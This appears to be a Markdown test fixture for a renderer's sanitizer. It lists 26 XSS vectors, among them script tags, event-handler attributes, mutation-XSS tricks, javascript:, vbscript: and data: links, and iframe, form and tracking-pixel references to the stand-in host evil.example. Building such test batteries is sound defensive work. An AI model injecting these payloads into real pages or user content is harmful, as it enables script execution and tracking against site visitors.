# Security battery

## 1. inline script

<script>alert('x1')</script>

after

## 2. img onerror

![x](x" onerror="alert('x2')>.png)

## 3. raw img tag

<img src=x onerror="alert('x3')">

## 4. svg onload

<svg onload="alert('x4')"><circle r="1"/></svg>

## 5. iframe

<iframe src="https://evil.example/frame"></iframe>

## 6. object/embed

<object data="https://evil.example/o"></object><embed src="https://evil.example/e">

## 7. style import

<style>@import url(https://evil.example/s.css);</style>

## 8. form machinery

<form action="https://evil.example"><input type=submit><button>go</button></form>

## 9. body onload

<body onload="alert('x5')">text</body>

## 10. details ontoggle

<details open ontoggle="alert('x6')">d</details>

## 11. video source

<video><source onerror="alert('x7')"></video>

## 12. math mXSS

<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('x8')>--></style></mglyph></table></mtext></math>

## 13. noscript mXSS

<noscript><p title="</noscript><img src=x onerror=alert('x9')>">

## 14. template tag

<template><script>alert('x10')</script></template>

## 15. srcset

<img srcset="https://evil.example/1x 1x" src="https://evil.example/def.png">

## 16. marquee starttag

<marquee onstart=alert('x11')>m</marquee>

## 17. anchor with js + quotes

[click](javascript:alert('x12'))

## 18. anchor vbscript

[click](vbscript:msgbox("x"))

## 19. anchor data uri

[click](data:text/html,<script>alert('x13')</script>)

## 20. anchor encoded tab

[click](jav&#x09;ascript:alert('x14'))

## 21. anchor protocol relative

[click](//evil.example/phish)

## 22. img data-svg

![d](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoJ3gxNScpIj48L3N2Zz4=)

## 23. remote image

![r](https://evil.example/track.png)

## 24. remote image with query

![r2](https://evil.example/pixel?id=leak-test)

## 25. autolink js

<javascript:alert('x16')>

## 26. nested bold XSS

**[x](javascript:alert('x17'))**
